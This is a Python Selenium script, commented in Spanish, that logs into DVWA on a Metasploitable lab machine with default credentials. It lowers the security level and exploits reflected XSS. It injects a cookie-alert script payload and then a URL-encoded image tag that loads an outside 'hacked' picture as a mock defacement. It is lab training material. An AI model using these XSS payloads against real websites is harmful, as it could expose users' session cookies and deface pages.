# -*- coding: utf-8 -*-
# Autor: @kr1shn4murt1
# Fecha: Julio 11 2017
# Este script se loguea a DVWA y explota la vulnerabilidad XSS


# Loguearse a DVWA

########################## Inicia Login  ####################

import time
from selenium import webdriver

url_Metasploitable= 'http://192.168.40.142/'
browser= webdriver.Firefox()
browser.get(url_Metasploitable)

# Link DVWA /x:html/x:body/x:ul/x:li[4]/x:a -- filtrado # /html/body/ul/li[4]/a
a= browser.find_elements_by_xpath('/html/body/ul/li[4]/a')

# Darle click al link de DVWA
a[0].click()

time.sleep(1)
# Condicion que espera que los campos de login sean visibles
#a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/form/fieldset/input[1]")))

# Se declara el punto de entrada de usuario, 
# tambien se puede usar el xpath anterior para declarar el elemento
campo_User= browser.find_element_by_name('username')
# Se declara el punto de entrada de password
campo_Password= browser.find_element_by_name('password')

# Se llena el campo usuario con la palabra admin
campo_User.send_keys("admin")
# Se llena el campo password con la palabra password
campo_Password.send_keys("password")

# Se declara el cuadro de login para darle click  mas abajo
a= browser.find_elements_by_xpath('/html/body/div/form/fieldset/p/input')

# Darle click al link de login
a[0].click()

####################### Termina login #####################

######## Inicia Poner el nivel de seguridad en low ########

time.sleep(1)
# Condicion para esperar que sea visible el menu de security
#a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_menu_padded')/ul[3]/li[1]/a")))

# Link de dvwa security 
a= browser.find_elements_by_xpath("id('main_menu_padded')/ul[3]/li[1]/a")
a[0].click()

# Condicion para esperar que sea visible la opcion de security low
#a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_body')/div/form/select/option[1]")))

time.sleep(2)

# Opcion de dvwa security low
a= browser.find_elements_by_xpath("id('main_body')/div/form/select/option[1]")
a[0].click()

# Click a submit para que quede security en low
a= browser.find_elements_by_xpath("id('main_body')/div/form/input")
a[0].click()

######## Termina Poner el nivel de seguridad en low ########

##############  Inicia explotacion de XSS   ################

# Click a menu XSS reflected
a= browser.find_element_by_xpath("id('main_menu_padded')/ul[2]/li[8]/a")
a.click()

# Enviar Krishna en el campo whats your name
time.sleep(2)
campo_Input= browser.find_element_by_xpath("id('main_body')/div/div/form/input[1]")
campo_Input.send_keys("Krishna")
# Botn submit
a= browser.find_element_by_xpath("id('main_body')/div/div/form/input[2]")
a.click()

# Enviar alert.cookie
time.sleep(2)
campo_Input= browser.find_element_by_xpath("id('main_body')/div/div/form/input[1]")
campo_Input.send_keys("<script>alert(document.cookie);</script>")
# Botn submit
a= browser.find_element_by_xpath("id('main_body')/div/div/form/input[2]")
a.click()

# A partir de aqui usar la url para la explotacion
# Incluir una imagen de otra web (defacement virtual)
time.sleep(2)
browser.get('http://192.168.40.142/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22http%3A%2F%2Fwww.technollama.co.uk%2Fwp-content%2Fuploads%2F2013%2F07%2Fhacked.png%22%3C%2Fimg%3E#')


##############  Termina explotacion de XSS  ################